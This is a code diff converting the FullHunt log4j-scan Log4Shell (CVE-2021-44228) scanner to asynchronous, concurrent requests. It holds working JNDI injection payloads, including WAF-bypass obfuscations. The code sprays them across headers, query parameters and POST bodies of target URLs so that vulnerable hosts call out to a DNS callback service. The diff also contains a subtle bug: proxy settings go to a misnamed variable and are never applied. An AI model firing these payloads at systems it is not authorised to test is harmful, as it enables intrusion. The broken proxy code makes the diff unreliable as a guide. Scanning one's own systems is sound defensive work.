@@ -9,29 +9,33 @@
 # ******************************************************************
 
 import argparse
+import asyncio
+from asyncio.locks import Semaphore
+import base64
+import contextlib
+import json
+from os import sendfile
 import random
+import sys
 import requests
 import time
-import sys
-from urllib import parse as urlparse
-import base64
-import json
-import random
-from uuid import uuid4
 from base64 import b64encode
-from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.PublicKey import RSA
-from Crypto.Hash import SHA256
-from termcolor import cprint
+from urllib import parse as urlparse
+from uuid import uuid4
 
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.Hash import SHA256
+from Crypto.PublicKey import RSA
+from httpx import AsyncClient
+from termcolor import cprint
 
 # Disable SSL warnings
 try:
     import requests.packages.urllib3
+
     requests.packages.urllib3.disable_warnings()
 except Exception:
     pass
-
 
 cprint('[•] CVE-2021-44228 - Apache Log4j RCE Scanner', "green")
 cprint('[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.', "yellow")
@@ -41,14 +45,14 @@ if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
 
-
 default_headers = {
     'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
     # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
-post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 4
+post_data_parameters = ["username", "user",
+                        "email", "email_address", "password"]
+timeout = 5
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
@@ -109,17 +113,21 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
-parser.add_argument("--disable-http-redirects",
-                    dest="disable_redirects",
-                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
-                    action='store_true')
+parser.add_argument("--max-tasks",
+                    dest="max_tasks",
+                    help="Maximum amount of concurrent requests running at the same time (default 20).",
+                    action="store",
+                    type=int,
+                    default=20)
 
 args = parser.parse_args()
 
-
 proxies = {}
+httpx_proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
+    https_proxies = {"http://": args.proxy, "https://": args.proxy}
+
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -156,15 +164,11 @@ def generate_waf_bypass_payloads(callback_host, random_string):
 class Dnslog(object):
     def __init__(self):
         self.s = requests.session()
-        req = self.s.get("http://www.dnslog.cn/getdomain.php",
-                         proxies=proxies,
-                         timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
         self.domain = req.text
 
     def pull_logs(self):
-        req = self.s.get("http://www.dnslog.cn/getrecords.php",
-                         proxies=proxies,
-                         timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
         return req.json()
 
 
@@ -184,14 +188,13 @@ class Interactsh:
         self.secret = str(uuid4())
         self.encoded = b64encode(self.public_key).decode("utf8")
         guid = uuid4().hex.ljust(33, 'a')
-        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
+        guid = ''.join(i if i.isdigit() else chr(
+            ord(i) + random.randint(0, 20)) for i in guid)
         self.domain = f'{guid}.{self.server}'
         self.correlation_id = self.domain[:20]
 
         self.session = requests.session()
         self.session.headers = self.headers
-        self.session.verify = False
-        self.session.proxies = proxies
         self.register()
 
     def register(self):
@@ -222,7 +225,8 @@ class Interactsh:
         decode = base64.b64decode(data)
         bs = AES.block_size
         iv = decode[:bs]
-        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
+        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB,
+                          IV=iv, segment_size=128)
         plain_text = cryptor.decrypt(decode)
         return json.loads(plain_text[16:])
 
@@ -249,68 +253,73 @@ def parse_url(url):
 
     # FilePath: /login.jsp
     file_path = urlparse.urlparse(url).path
-    if (file_path == ''):
+    if file_path == '':
         file_path = '/'
 
-    return({"scheme": scheme,
-            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
-            "host":  urlparse.urlparse(url).netloc.split(":")[0],
-            "file_path": file_path})
+    return ({"scheme": scheme,
+             "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
+             "host": urlparse.urlparse(url).netloc.split(":")[0],
+             "file_path": file_path})
 
 
-def scan_url(url, callback_host):
+async def scan_url(client: AsyncClient, url, callback_host, semaphore):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
-    payloads = [payload]
+    payloads = [
+        # This payload might fail on some versions of Log4j, as variables aren't supported
+        # better use this manually to verify and track the system.
+        # f'${{jndi:ldap://${hostName}.{parsed_url["host"]}.{callback_host}/{random_string}}}',
+
+        # Some invalid internet-target to check your firewall logs for, in case your system can't do DNS look-ups on the internet
+        # '${jndi:ldap://1.2.3.4:56789/}'
+
+        f'${{jndi:ldap://{parsed_url["host"]}.{callback_host}/{random_string}}}',
+    ]
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        payloads.extend(generate_waf_bypass_payloads(
+            f'{parsed_url["host"]}.{callback_host}', random_string))
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        # cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
-                requests.request(url=url,
-                                 method="GET",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                async with semaphore:
+                    cprint(f"[•] GET  URL: {url} | PAYLOAD: {payload}", "magenta")
+                    result = await client.get(url=url,
+                                              params={"v": payload},
+                                              headers=get_fuzzing_headers(payload))
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+                #cprint(f"[{e.__class__.__name__}] {url}")
+                pass
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
             try:
                 # Post body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 data=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                async with semaphore:
+                    cprint(f"[•] POST URL: {url} | PAYLOAD: {payload}", "magenta")
+                    result = await client.post(url=url,
+                                               params={"v": payload},
+                                               headers=get_fuzzing_headers(
+                                                   payload),
+                                               data=get_fuzzing_post_data(payload))
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+                #cprint(f"[{e.__class__.__name__}] {url}")
+                pass
 
             try:
                 # JSON body
-                requests.request(url=url,
-                                 method="POST",
-                                 params={"v": payload},
-                                 headers=get_fuzzing_headers(payload),
-                                 json=get_fuzzing_post_data(payload),
-                                 verify=False,
-                                 timeout=timeout,
-                                 allow_redirects=(not args.disable_redirects),
-                                 proxies=proxies)
+                async with semaphore:
+                    cprint(f"[•] JSON URL: {url} | PAYLOAD: {payload}", "magenta")
+                    result = await client.post(url=url,
+                                               params={"v": payload},
+                                               headers=get_fuzzing_headers(
+                                                   payload),
+                                               json=get_fuzzing_post_data(payload))
             except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+                #cprint(f"[{e.__class__.__name__}] {url}")
+                pass
 
 
-def main():
+async def main():
     urls = []
     if args.url:
         urls.append(args.url)
@@ -324,10 +333,12 @@ def main():
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  args.custom_dns_callback_host
+        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. "
+               "No verification will be done after sending fuzz requests.")
+        dns_callback_host = args.custom_dns_callback_host
     else:
-        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
+        cprint(
+            f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
             dns_callback = Interactsh()
         elif args.dns_callback_provider == "dnslog.cn":
@@ -337,29 +348,41 @@ def main():
         dns_callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
+    global_semaphore = asyncio.Semaphore(
+        args.max_tasks) if args.max_tasks else contextlib.nullcontext()
+    extended_urls = []
+
+    # Scan results often lack their respective schema - try both, if none is given
     for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, dns_callback_host)
+        if "://" not in url:
+            extended_urls.extend([f"http://{url}", f"https://{url}"])
+        else:
+            extended_urls.append(url)
+    
+    # Create a httpx.AsyncClient and schedule all requests as async tasks.
+    async with AsyncClient(verify=False, timeout=timeout, proxies=httpx_proxies) as http:
+        results = await asyncio.gather(*[scan_url(http, url, dns_callback_host, global_semaphore) for url in extended_urls])
 
     if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, "
+               "please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
         return
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
-    time.sleep(int(args.wait_time))
+    time.sleep(args.wait_time)
     records = dns_callback.pull_logs()
     if len(records) == 0:
         cprint("[•] Targets does not seem to be vulnerable.", "green")
     else:
-        cprint("[!!!] Target Affected", "yellow")
+        cprint("[!!!] Target Affected", "red")
         for i in records:
             cprint(i, "yellow")
 
 
 if __name__ == "__main__":
     try:
-        main()
+        asyncio.run(main())
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
